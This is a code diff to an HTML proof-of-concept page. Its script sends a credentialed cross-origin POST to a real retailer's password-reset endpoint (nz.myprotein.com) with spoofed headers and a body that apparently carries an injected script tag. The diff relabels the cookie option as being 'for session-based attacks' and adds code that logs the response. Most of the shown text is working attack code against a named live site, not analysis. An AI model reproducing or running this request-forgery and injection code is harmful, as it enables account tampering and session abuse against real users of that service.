@@ -7,8 +7,8 @@
     <script>
         fetch("https://nz.myprotein.com/passwordReset.account", {
             method: "POST",
-            mode: "cors",  // Attempt CORS if possible
-            credentials: "include", // Include cookies if required
+            mode: "cors",  // Attempt CORS request
+            credentials: "include", // Include cookies for session-based attacks
             headers: {
                 "Host": "nz.myprotein.com",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
@@ -17,7 +17,6 @@
                 "Accept-Encoding": "gzip, deflate, br",
                 "Referer": "https://nz.myprotein.com/",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Content-Length": "233",
                 "Origin": "https://nz.myprotein.com/",
                 "Dnt": "1",
                 "Sec-Gpc": "1",
@@ -44,7 +43,10 @@
 "<"
 /
 script>`
-        });
+        })
+        .then(response => response.text())
+        .then(data => console.log("Response:", data))
+        .catch(error => console.error("Error:", error));
     </script>
 </body>
 </html>
